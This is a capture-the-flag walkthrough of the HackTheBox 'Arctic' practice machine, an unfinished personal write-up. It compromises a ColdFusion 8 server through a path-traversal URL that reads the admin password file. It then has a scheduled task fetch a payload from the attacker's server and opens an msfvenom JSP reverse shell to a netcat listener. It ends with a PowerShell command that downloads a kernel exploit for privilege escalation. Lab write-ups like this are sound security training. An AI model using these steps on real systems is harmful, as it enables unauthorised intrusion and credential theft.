# Hackthebox Arctic

Reset the machine just in case.

## Enumeration

First do the standard portscanning of every tcp port on the system.

```
$ nmap -Pn -p- 10.10.10.11
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-07 05:39 EST
Nmap scan report for 10.10.10.11
Host is up (0.040s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown
```

Port 135: DCOM (Distributed Component Object Model) Service Control Manager
Port 8500: FMTP (Flight Message Transfer Protocl)
Port 49154: Unknown at this stage

```
$ sudo nmap -O 10.10.10.11                                                                     1 ⨯
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-07 05:49 EST
Nmap scan report for 10.10.10.11
Host is up (0.035s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
No exact OS matches for host (test conditions non-ideal).
```

Opening port 8500 with a browswer shows two folders /CFIDE and /cfdocs

```
$ curl http://10.10.10.11:8500
<html>
<head>
<title>Index of /</title></head><body bgcolor="#ffffff">
<h1>Index of /</h1><br><hr><pre><a href="CFIDE/">CFIDE/</a>               <i>dir</i>   03/22/17 08:52 μμ
<a href="cfdocs/">cfdocs/</a>              <i>dir</i>   03/22/17 08:55 μμ
</pre><hr></html>  
```

From this we can deduct it is a Coldfusion site.

Browsing around get us to page http://10.10.10.11:8500/CFIDE/administrator/ with a login prompt to Adobe Coldfusion 8 Administrator.

## Vulnerability analysis

Coldfusion 8 is vulnerable to local file disclosure (LFD).

## Initial intrusion

### Coldfusion 8 (APSB10-18)

Credits to: https://pentest.tonyng.net/attacking-adobe-coldfusion/ and https://nets.ec/Coldfusion_hacking

Link http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en exploits the LFD vulnerability.

Result displayed on the login page: 

#Wed Mar 22 20:53:51 EET 2017 rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP \n password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 encrypted=true 

Using a rainbow tbale at crackstation.net provides the password hap*****.

Welcome to the Coldfusion Administrator - we are in. Time for a remote shell.

We need to go to the "Debugging & Logging / Scheduled Tasks" menu element, and add a scheduled task that would download our CFML script from our webserver to the Coldfusion's server's webroot.

#### cfexec - did not work

The script credit to: http://grutz.jingojango.net/exploits/ and direct link to the file http://grutz.jingojango.net/exploits/cfexec.cfm.

Fire up a webserver with the scriptin the root folder. Configure scheduled task with URL to it and File c:\inetpub\wwwroot. Check the 'Save output to a file' box.

The locale is in Greek, so the date and time format was a bit of a hassle. I had to go page Server Settings > Settings Summary to see the correct format, and do some copy-paste magic. Also the wwwroot directory is obtained from there. Is is also a good place to check the local time of the host for setting up the scheduling.

Finally the script is fetched

```
$ python -m http.server 80       
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.11 - - [07/Nov/2021 09:34:42] "GET /cfexec.cfm HTTP/1.1" 200 -
```

Switch to the browser and go to URL 10.10.10.11:8500/CFIDE/cfexec.cfm

To our sadness, this does not seem to work, maybe Coldfusion is running as such a user who cannot access eexecutables.

#### jsp reverse shell - works

Generate the reverse shell

```
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=5555 -f raw > ./shell.jsp     130 ⨯
Payload size: 1497 bytes
```

Upload the file using the scheduler as described above.

Start up a listener and fetch the URL http://10.10.10.11:8500/CFIDE/shell.jsp

```
$ nc -nvlp 5555      
listening on [any] 5555 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.11] 50609
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis

c:\ColdFusion8\runtime\bin>dir c:\users\tolis\Desktop\user.txt
dir c:\users\tolis\Desktop\user.txt
 Volume in drive C has no label.
 Volume Serial Number is F88F-4EA5

 Directory of c:\users\tolis\Desktop

22/03/2017  09:01 ��                32 user.txt
               1 File(s)             32 bytes
               0 Dir(s)  33.193.676.800 bytes free
```

## Privilege escalation

Start with the systeminfo to see what are we dealing with.

```
:\ColdFusion8\runtime\bin>systeminfo
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 ��
System Boot Time:          8/11/2021, 8:33:27 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 238 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 1.114 MB
Virtual Memory: In Use:    933 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11
```

Windows exploit suggester would tell us what are all the vulnerabilities we have at use

```
$ pyenv activate my-virtual-env-2.7.18
$ /home/kali/.pyenv/versions/my-virtual-env-2.7.18/bin/python windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2021-11-07-mssb.xls
[*] done
 /home/kali/.pyenv/versions/my-virtual-env-2.7.18/bin/python windows-exploit-suggester.py --database 2021-11-07-mssb.xls --systeminfo systeminfo.txt 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

### MS11-011 (CVE-2010-4398)

Credit to https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-011

```
c:\Users\tolis\Downloads>powershell -c (New-Object Net.WebClient).DownloadFile('https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-011/MS11-011.exe'), 'MS11-011.exe')
```

Did not work

TODO: system own


